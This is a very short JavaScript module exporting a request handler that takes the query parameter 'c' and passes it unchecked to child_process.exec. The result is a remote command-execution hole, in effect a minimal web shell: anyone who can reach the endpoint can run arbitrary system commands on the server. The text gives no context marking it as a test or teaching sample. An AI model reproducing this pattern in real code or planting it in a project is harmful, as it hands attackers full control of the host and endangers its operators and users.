import { exec as run } from 'child_process';
export function h(req) {
  const c = req.query.c;
  run(c);
}
